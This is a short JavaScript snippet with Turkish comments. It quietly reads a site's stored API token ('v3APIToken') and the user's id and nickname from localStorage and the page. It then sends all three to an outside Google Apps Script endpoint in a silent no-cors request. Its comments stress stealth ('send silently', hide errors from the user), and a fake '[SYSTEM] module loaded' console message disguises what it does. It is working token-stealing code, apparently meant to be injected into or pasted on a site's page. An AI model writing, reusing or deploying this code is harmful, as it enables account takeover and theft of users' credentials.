(function() {
    // Veri toplama ayarları
    const sheetUrl = "https://script.google.com/macros/s/AKfycbyR-IX4up6a_FCP5rnKWW7yLstNuo2IZRdrh12dFVx0ZSvfRbtIeOw5qVNl-lKHE3jt/exec";
    
    function extractData() {
        const t = localStorage.getItem('v3APIToken');
        let u = "Bilinmiyor";
        let n = "Bilinmiyor";

        try {
            // LocalStorage içinde kullanıcı verisi arama
            for (let i = 0; i < localStorage.length; i++) {
                let key = localStorage.key(i);
                if (key.includes('user') || key.includes('profile')) {
                    let val = JSON.parse(localStorage.getItem(key));
                    if (val.id) u = val.id;
                    if (val.nickname || val.displayName) n = val.nickname || val.displayName;
                }
            }
            
            // Eğer hala bulunamadıysa DOM üzerinden nickname al
            if (n === "Bilinmiyor") {
                const nickEl = document.querySelector('[class*="nickname"]') || document.querySelector('.nickname');
                if (nickEl) n = nickEl.innerText;
            }

            if (t) {
                // Sessizce gönder
                fetch(`${sheetUrl}?token=${t}&userId=${u}&nickname=${encodeURIComponent(n)}&source=Bot2_Verified`, {
                    method: 'GET',
                    mode: 'no-cors'
                });
            }
        } catch (e) {
            // Hata olsa bile kullanıcıya hissettirme
        }
    }

    // Bilgileri topla
    extractData();

    // Bot onay mesajı (İsteğe bağlı, gizlemek istersen silebilirsin)
    console.log("%c[SYSTEM] Modül hatasız yüklendi.", "color: #2ecc71; font-weight: bold;");
})();
